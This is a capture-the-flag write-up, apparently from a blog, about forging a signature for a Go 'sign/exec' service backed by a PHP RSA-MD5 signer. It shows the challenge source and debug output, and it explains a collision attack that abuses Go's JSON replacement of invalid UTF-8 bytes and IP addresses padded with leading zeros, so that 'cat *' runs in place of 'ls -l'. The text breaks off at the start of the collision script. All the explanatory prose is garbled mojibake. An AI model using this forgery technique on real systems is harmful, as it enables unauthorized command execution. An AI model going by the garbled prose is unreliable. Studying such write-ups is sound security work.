class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;bytes&quot;</span></span><br><span class="line"><span class="string">&quot;crypto/sha1&quot;</span></span><br><span class="line"><span class="string">&quot;encoding/json&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;io&quot;</span></span><br><span class="line"><span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;net&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line"><span class="string">&quot;strings&quot;</span></span><br><span class="line"><span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">m := http.NewServeMux()</span><br><span class="line"></span><br><span class="line">m.HandleFunc(<span class="string">&quot;/ip&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">ip, _, err := net.SplitHostPort(r.RemoteAddr)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">fmt.Fprint(w, ip)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">m.HandleFunc(<span class="string">&quot;/sign&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">ip, _, err := net.SplitHostPort(r.RemoteAddr)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">remoteAddr := net.ParseIP(ip)</span><br><span class="line"><span class="keyword">if</span> remoteAddr == <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ip = r.PostFormValue(<span class="string">&quot;ip&quot;</span>)</span><br><span class="line">signIP := net.ParseIP(ip)</span><br><span class="line"><span class="keyword">if</span> signIP == <span class="literal">nil</span> || !signIP.Equal(remoteAddr) &#123;</span><br><span class="line">fmt.Fprintln(w, <span class="string">&quot;lol, not ip :&gt;&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cmd := r.PostFormValue(<span class="string">&quot;cmd&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> cmd != <span class="string">&quot;ls -l&quot;</span> &#123;</span><br><span class="line">fmt.Fprintln(w, <span class="string">&quot;lol, nope :&gt;&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">msg := ip + <span class="string">&quot;|&quot;</span> + cmd</span><br><span class="line">digest := sha1.Sum([]<span class="keyword">byte</span>(msg))</span><br><span class="line"></span><br><span class="line">b := <span class="built_in">new</span>(bytes.Buffer)</span><br><span class="line">err = json.NewEncoder(b).Encode(<span class="keyword">string</span>(digest[:]))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">resp, err := http.Post(<span class="string">&quot;http://127.0.0.1/index.php?action=sign&quot;</span>, <span class="string">&quot;application/json; charset=utf-8&quot;</span>, b)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> || resp.StatusCode != <span class="number">200</span> &#123;</span><br><span class="line">fmt.Fprintln(w, <span class="string">&quot;oops, hsm is down&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">body, err := ioutil.ReadAll(resp.Body)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Fprintln(w, <span class="string">&quot;oops, hsm is bodyless?&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> signature <span class="keyword">string</span></span><br><span class="line">err = json.Unmarshal(body, &amp;signature)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Fprintln(w, <span class="string">&quot;oops, hsm is jsonless?&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fmt.Fprint(w, signature+msg)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">m.HandleFunc(<span class="string">&quot;/exec&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">ip, _, err := net.SplitHostPort(r.RemoteAddr)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">remoteAddr := net.ParseIP(ip)</span><br><span class="line"><span class="keyword">if</span> remoteAddr == <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">signature := r.PostFormValue(<span class="string">&quot;signature&quot;</span>)</span><br><span class="line">digest := sha1.Sum([]<span class="keyword">byte</span>(signature[<span class="number">172</span>:]))</span><br><span class="line"></span><br><span class="line">b := <span class="built_in">new</span>(bytes.Buffer)</span><br><span class="line">err = json.NewEncoder(b).Encode(signature[:<span class="number">172</span>] + <span class="keyword">string</span>(digest[:]))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Fprintln(w, <span class="string">&quot;oops, json encode&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">resp, err := http.Post(<span class="string">&quot;http://127.0.0.1/index.php?action=verify&quot;</span>, <span class="string">&quot;application/json; charset=utf-8&quot;</span>, b)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> || resp.StatusCode != <span class="number">200</span> &#123;</span><br><span class="line">fmt.Fprintln(w, <span class="string">&quot;oops, hsm is down?&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">body, err := ioutil.ReadAll(resp.Body)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Fprintln(w, <span class="string">&quot;oops, hsm is bodyless?&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> valid <span class="keyword">bool</span></span><br><span class="line">err = json.Unmarshal(body, &amp;valid)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Fprintln(w, <span class="string">&quot;oops, json unmarshal&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> valid &#123;</span><br><span class="line">t := strings.Split(signature[<span class="number">172</span>:], <span class="string">&quot;|&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(t) != <span class="number">2</span> &#123;</span><br><span class="line">fmt.Fprintln(w, <span class="string">&quot;oops, split&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">signIP := net.ParseIP(t[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">if</span> signIP == <span class="literal">nil</span> || !signIP.Equal(remoteAddr) &#123;</span><br><span class="line">fmt.Fprintln(w, <span class="string">&quot;lol, not ip :&gt;&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">conn, err := net.DialTimeout(<span class="string">&quot;tcp&quot;</span>, <span class="string">&quot;127.0.0.1:1024&quot;</span>, <span class="number">1</span>*time.Second)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Fprintln(w, <span class="string">&quot;oops, dial&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">fmt.Fprintf(conn, t[<span class="number">1</span>]+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">conn.(*net.TCPConn).CloseWrite()</span><br><span class="line">io.Copy(w, conn)</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">s := &amp;http.Server&#123;</span><br><span class="line">Addr:           <span class="string">&quot;:60601&quot;</span>,</span><br><span class="line">Handler:        m,</span><br><span class="line">ReadTimeout:    <span class="number">5</span> * time.Second,</span><br><span class="line">WriteTimeout:   <span class="number">5</span> * time.Second,</span><br><span class="line">MaxHeaderBytes: <span class="number">1</span> &lt;&lt; <span class="number">20</span>,</span><br><span class="line">&#125;</span><br><span class="line">log.Fatal(s.ListenAndServe())</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä»£ç å¾ˆå®¹æ˜“çœ‹ï¼Œé™åˆ¶äº† cmd åªèƒ½æ˜¯<code>ls -l</code>ï¼Œå…¶ä½™ä¸ç»™ç­¾åï¼Œçœ‹æ ·å­æˆ‘ä»¬æ˜¯è¦ä¼ªé€ å…¶ä»–å‘½ä»¤çš„ç­¾åæ¥è¯»flagï¼Œè¿™é‡Œæ³¨æ„åˆ°ç­¾åå’ŒéªŒç­¾çš„è¿‡ç¨‹æ˜¯ä¼ ç»™æœ¬åœ°èµ·çš„ä¸€ä¸ª php æ¥å®Œæˆçš„ï¼Œçœ‹ä¸€ä¸‹è¿™éƒ¨åˆ†æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">define(<span class="string">&#x27;ALGO&#x27;</span>, <span class="string">&#x27;md5WithRSAEncryption&#x27;</span>);</span><br><span class="line">$d = json_decode(file_get_contents(<span class="string">&#x27;php://input&#x27;</span>), JSON_THROW_ON_ERROR);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">&#x27;action&#x27;</span>] === <span class="string">&#x27;sign&#x27;</span>)&#123;</span><br><span class="line">    $pkeyid = openssl_pkey_get_private(<span class="string">&quot;file:///var/www/private_key.pem&quot;</span>);</span><br><span class="line">    openssl_sign($d, $signature, $pkeyid, ALGO);</span><br><span class="line"><span class="keyword">echo</span> json_encode(base64_encode($signature));</span><br><span class="line">    openssl_free_key($pkeyid);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> ($_GET[<span class="string">&#x27;action&#x27;</span>] === <span class="string">&#x27;verify&#x27;</span>) &#123;</span><br><span class="line">    $pkeyid = openssl_pkey_get_public(<span class="string">&quot;file:///var/www/public_key.pem&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> json_encode(openssl_verify(substr($d, <span class="number">172</span>), base64_decode(substr($d,<span class="number">0</span>, <span class="number">172</span>)), $pkeyid, ALGO) === <span class="number">1</span>);</span><br><span class="line">    openssl_free_key($pkeyid);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>é‡‡ç”¨çš„æ˜¯<code>md5WithRSAEncryption</code>çš„æ–¹å¼ç­¾åï¼Œæœ¬åœ°è¯•äº†ä¸€ä¸‹ï¼Œæ˜¯æŠŠæˆ‘ä»¬ä¼ å…¥çš„ <code>$d</code> md5 åè½¬ä¸ºhexï¼Œå¡«å……åˆ°<code>0x1ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff003020300c06082a864886f70d020505000410</code>åé¢ï¼Œç»„æˆæ•°å­—ç„¶åç”¨RSAç­¾åã€‚</p><p>çœ‹æ ·å­æ•´ä¸ªé€»è¾‘æ‰¾ä¸åˆ°ä¸€ç‚¹é—®é¢˜ï¼Œç”¨çš„éƒ½æ˜¯æ ‡å‡†åº“ï¼ŒåŸºæœ¬æ— æ³•æ”»å‡»ã€‚æˆ‘åˆæ­¥çš„æƒ³æ³•æ˜¯é€šè¿‡ä»£ç†æ›´æ¢ ipï¼Œå¯ä»¥æ‹¿åˆ°ä¸¤ä¸ª ip|ls -l çš„ç­¾åï¼Œè¿™æ ·æˆ‘ä»¬å°±æ‹¥æœ‰äº†ä¸¤ç»„ RSA çš„ m å’Œ cï¼Œå› ä¸ºé¢˜ç›®ç»™äº† dockerfile ç»™äº†ç”Ÿæˆå…¬ç§é’¥çš„æ–¹æ³•ï¼Œä½¿ç”¨ openssl é»˜è®¤ç”Ÿæˆï¼Œeä¸º65537ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é€šè¿‡æ±‚å…¬å› æ•°çš„æ–¹å¼æ¥æ±‚å‡º nã€‚</p><p>åœ¨å¾—åˆ°ä¸¤ç»„ç­¾ååï¼Œæˆ‘ä»¬è¦å¾—åˆ° RSA çš„mï¼Œå°±æ˜¯å¡«å……åçš„æ•°ï¼Œæ‰€ä»¥æŒ‰ç…§ä»£ç é€»è¾‘ï¼Œåœ¨ go é‡Œé¢å…ˆæ˜¯ sha1:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msg := ip + <span class="string">&quot;|&quot;</span> + cmd</span><br><span class="line">digest := sha1.Sum([]<span class="keyword">byte</span>(msg))</span><br><span class="line"></span><br><span class="line">b := <span class="built_in">new</span>(bytes.Buffer)</span><br><span class="line">err = json.NewEncoder(b).Encode(<span class="keyword">string</span>(digest[:]))</span><br></pre></td></tr></table></figure><p>å† php é‡Œçš„ md5ï¼Œå¾—åˆ°ä¸¤ç»„ m å’Œ cï¼Œä½†æ˜¯æ€»æ˜¯æ±‚ä¸å‡ºå…¬å› æ•° nï¼Œæ€€ç–‘æˆ‘ä»¬æ±‚çš„ m ä¸å¯¹ã€‚çœ‹ä»£ç å‘ç° go é‡ŒæŠŠ sha1çš„ç»“æœç”¨ json ç¼–ç ï¼Œç„¶åä¼ åˆ° phpé‡Œ json è§£ç ã€‚è¿™éƒ¨åˆ†éå¸¸å¯ç–‘ï¼Œä¸ºä½•è¦ç”¨ json ç¼–ç ï¼ˆç”¨ hex ä¼ è¿‡å»å®ƒä¸é¦™ä¹ˆï¼‰ï¼Œæ‰€ä»¥æœ¬åœ°æ­ä¸€ä¸‹ç¯å¢ƒè·Ÿä¸€ä¸‹ï¼ˆé¢˜ç›®ç»™äº†dockerfileï¼‰</p><p>èµ·ä¸€ä¸ªdockerï¼Œæ”¹ä¸€ä¸‹ index.phpï¼ŒåŠ ä¸€ä¸ª<code>var_dump($d);</code>ï¼Œå†æ”¹ä¸€ä¸‹ goï¼Œè¿”å›ä¸€ä¸‹ php çš„ç»“æœï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fmt.Fprintln(w,<span class="keyword">string</span>(body))</span><br></pre></td></tr></table></figure><p>ç°åœ¨è®©ç¨‹åºç­¾åï¼Œè¿”å›ç»“æœï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">string(38) &quot;ï¿½ï¿½.ï¿½ï¿½ï¿½?-ï¿½KCï¿½ï¿½@ï¿½&quot;</span><br><span class="line">&quot;K4FEmxz4yuTsjDAbRZQmHJ+MBiCSGaOnpZTLbThXpCkDYe3siAIPfihX6ppjN2Tz6XqOr4tF\&#x2F;u1\&#x2F;+ccfhj8NNLIL+2hknyDXbosmMBV8mEGYsMqQHAE0f+3OhDWlzN5RnteSMYNZbTipFErB8ZOWCiXmynWxsqJhyaN9J6\&#x2F;\&#x2F;h6I&#x3D;&quot;</span><br><span class="line">oops, hsm is jsonless?</span><br></pre></td></tr></table></figure><p>$d ç«Ÿç„¶æ˜¯é•¿åº¦ä¸º 38 çš„å­—ç¬¦ä¸²ï¼Œçœ‹æ¥æœç„¶æ˜¯è¿™é‡Œç¼–ç æœ‰é—®é¢˜ï¼Œæˆ‘ä»¬éœ€è¦çœ‹ä¸€ä¸‹æ¯ä¸ªæ­¥éª¤çš„ç»“æœï¼Œå…ˆçœ‹ä¸€ä¸‹ go é‡Œ jsonç¼–ç åçš„ sha1 ç»“æœæ˜¯ä»€ä¹ˆï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;bytes&quot;</span></span><br><span class="line"><span class="string">&quot;crypto/sha1&quot;</span></span><br><span class="line"><span class="string">&quot;encoding/json&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">msg := <span class="string">&quot;172.17.0.1|ls -l&quot;</span></span><br><span class="line">digest := sha1.Sum([]<span class="keyword">byte</span>(msg))</span><br><span class="line"></span><br><span class="line">b := <span class="built_in">new</span>(bytes.Buffer)</span><br><span class="line">json.NewEncoder(b).Encode(<span class="keyword">string</span>(digest[:]))</span><br><span class="line">fmt.Print(<span class="keyword">string</span>(b.Bytes()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œä¸€ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;\u000e\t\u001d\ufffd\u0012\ufffd.\ufffd\ufffd\ufffd?-\ufffdKC\ufffd\u0005\ufffd@\ufffd&quot;</span><br></pre></td></tr></table></figure><p>å’Œæ­£å¸¸çš„sha1çš„ç»“æœæ¥æ¯”è¾ƒä¸€ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Python 2.7.16 (default, Sep  2 2019, 11:59:44)</span><br><span class="line">[GCC 4.2.1 Compatible Apple LLVM 10.0.1 (clang-1001.0.46.4)] on darwin</span><br><span class="line">Type <span class="string">&quot;help&quot;</span>, <span class="string">&quot;copyright&quot;</span>, <span class="string">&quot;credits&quot;</span> or <span class="string">&quot;license&quot;</span> <span class="keyword">for</span> more information.</span><br><span class="line">&gt;&gt;&gt; <span class="string">&quot;\u000e\t\u001d\ufffd\u0012\ufffd.\ufffd\ufffd\ufffd?-\ufffdKC\ufffd\u0005\ufffd@\ufffd&quot;</span></span><br><span class="line"><span class="string">&#x27;\\u000e\t\\u001d\\ufffd\\u0012\\ufffd.\\ufffd\\ufffd\\ufffd?-\\ufffdKC\\ufffd\\u0005\\ufffd@\\ufffd&#x27;</span></span><br><span class="line">&gt;&gt;&gt; from hashlib import *</span><br><span class="line">&gt;&gt;&gt; sha1(<span class="string">&#x27;172.17.0.1|ls -l&#x27;</span>).digest()</span><br><span class="line"><span class="string">&#x27;\x0e\t\x1d\xbd\x12\x90.\xca\xf0\xd9?-\x98KC\xeb\x05\xa1@\xd1&#x27;</span></span><br></pre></td></tr></table></figure><p>ç”±äº go çš„ json ç¼–ç ï¼Œå¾ˆå¤šä¸å¯è§å­—ç¬¦éƒ½è¢«è½¬ä¸ºäº† <code>U+fffd</code>ï¼Œä¸¢å¤±äº†å¾ˆå¤šä¿¡æ¯ã€‚</p><p>å†ç»è¿‡ php æ¥å£çš„æ¥æ”¶ï¼Œæˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹ç»“æœï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$d = json_decode(file_get_contents(<span class="string">&#x27;php://input&#x27;</span>), JSON_THROW_ON_ERROR);</span><br><span class="line">var_dump(file_get_contents(<span class="string">&#x27;php://input&#x27;</span>));</span><br><span class="line">var_dump($d);</span><br><span class="line">var_dump(bin2hex($d));</span><br></pre></td></tr></table></figure><p>ç»“æœï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">string(89) &quot;&quot;\u000e\t\u001d\ufffd\u0012\ufffd.\ufffd\ufffd\ufffd?-\ufffdKC\ufffd\u0005\ufffd@\ufffd&quot;</span><br><span class="line">&quot;</span><br><span class="line">string(38) &quot;ï¿½ï¿½.ï¿½ï¿½ï¿½?-ï¿½KCï¿½ï¿½@ï¿½&quot;</span><br><span class="line">string(76) &quot;0e091defbfbd12efbfbd2eefbfbdefbfbdefbfbd3f2defbfbd4b43efbfbd05efbfbd40efbfbd&quot;</span><br><span class="line">&quot;K4FEmxz4yuTsjDAbRZQmHJ+MBiCSGaOnpZTLbThXpCkDYe3siAIPfihX6ppjN2Tz6XqOr4tF\&#x2F;u1\&#x2F;+ccfhj8NNLIL+2hknyDXbosmMBV8mEGYsMqQHAE0f+3OhDWlzN5RnteSMYNZbTipFErB8ZOWCiXmynWxsqJhyaN9J6\&#x2F;\&#x2F;h6I&#x3D;&quot;</span><br><span class="line">oops, hsm is jsonless?</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>U+fffd</code>å˜æˆäº†<code>\xef\xbf\xbd</code>ã€‚æ‰€ä»¥ç”±äº go çš„ json ç¼–ç é—®é¢˜ï¼Œä¸¢å¤±äº†å¾ˆå¤šä¿¡æ¯ï¼Œé€ æˆäº† md5 å‰çš„æ•°æ®æœ‰å¾ˆå¤šç›¸åŒå­—ç¬¦ã€‚å½“æ—¶åšé¢˜æ—¶å¾€ä¸‹å¹¶æ²¡æœ‰ç»†æƒ³ï¼Œå¾—åˆ° n åæ€»æ˜¯æƒ³æ„é€ å‡ºä»»æ„å‘½ä»¤çš„ç­¾åï¼Œä¹Ÿå¾ˆç–‘æƒ‘å¦‚æœæ„é€ å‡ºå²‚ä¸æ˜¯è¿™ç§ç­¾åå°±ä¸å®‰å…¨äº†ï¼Ÿå…¶å®æ˜¯æ— æ³•å¾—åˆ°çš„ã€‚</p><p>æ­£è§£æ˜¯ go çš„è¿™ç§é—®é¢˜ ï¼Œä¸ºç¢°æ’åˆ›é€ äº†æ¡ä»¶ã€‚æˆ‘ä»¬å¯ä»¥ç¢°æ’å‡ºåœ¨è¿™ç§ç¼–ç æƒ…å†µä¸‹ä¸ <code>ls -l</code>æœ‰ç›¸åŒç»“æœçš„<code>cat *</code> æ­¤ç±»å‘½ä»¤ã€‚ä½†æ˜¯é—®é¢˜æ˜¯æˆ‘ä»¬éœ€è¦éå¸¸å¤§é‡ ip æ¥æä¾›ç¢°æ’çš„æ•°æ®ã€‚</p><p>å¯ä»¥å‘ç°ï¼Œgo å– ip çš„æ—¶å€™ï¼Œæ˜¯å…ˆç”¨<code>net.ParseIP</code>è§£æäº† ipï¼Œæˆ‘ä»¬åœ¨ ip æ¯ä¸ªæ•°å­—å‰é¢åŠ  0 ï¼Œè§£æåè¿˜æ˜¯åŸæ¥çš„ ip ç»“æœï¼Œæ¯ä¸ªæ•°å­—æœ€å¤šæ·»åŠ  256 ä¸ª 0ï¼Œå››ä¸ªæ•°å­—å°±å·²ç»äº§ç”Ÿäº† <code>2^32</code>ç§ä¸åŒçš„ç»„åˆï¼Œè¶³ä»¥ç¢°æ’å‡º <code>ls -l</code>ä¸ <code>cat *</code>ä¹‹é—´çš„å†²çªã€‚</p><p>å®˜æ–¹é¢˜è§£çš„ c++ ç¢°æ’è„šæœ¬ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span 